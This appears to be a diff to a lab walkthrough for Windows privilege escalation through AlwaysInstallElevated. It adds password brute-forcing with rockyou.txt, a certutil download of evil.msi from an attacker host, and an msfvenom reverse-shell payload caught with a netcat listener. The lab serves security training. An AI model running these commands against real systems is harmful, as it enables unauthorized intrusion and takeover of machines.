@@ -32,24 +32,29 @@ Target Windows server must be accessible with valid domain credentials.
    ```bash
    ping <SERVER_IP>
    ```
-2. **Connect to the workstation and check for vulnerability**
-   - Connection with xfreerdp3 client with shared drive, clipboard etc
+2. **Connect to the workstation via ssh**
+   - Bruteforce the password for the user john using the rockyou.txt wordlist from seclists.
+   - Connect the to openssh server available on the windows computer.
    ```bash
-   xfreerdp3 /v:<WORKSTATION_IP> /u:<USERNAME> /p:'<PASSWORD>' /dynamic-resolution /drive:linux,/home/kali/shared +clipboard
+   ssh john@<TARGET_IP>
    ```
+   Then password.
    - Check for vulnerability
    ```bash
    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
    - If vulnerable, it will return `AlwaysInstallElevated    REG_DWORD    0x1`
-3. **Exploitation**
+4. **Exploitation**
    - Generate a payload on kali with msfvenom.
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f msi -o evil.msi
    ```
-   - Copy the payload to the Workstation by placing it in the shared folder, or serving it over python server.
+   - Copy the payload to the Workstation using certutil, or serving it over python server.
+   ```bash
+   certutil -urlcache -f http://<ATTACKER-IP>/evil.msi evil.msi
+   ```
    - Start a listener on Kali `nc -nlvp <PORT>`
-   - Execute the payload (evil.msi) and catch the shell. Find the flag in the desktop directory of the user john.
+   - Execute the payload (evil.msi) `./evil.msi` on the windows machine and catch the shell. Find the flag in the desktop directory of the user john.
 
 #### Why It Works
 Misconfigured permissions grant low-privileged users access to sensitive resources, enabling privilege escalation.
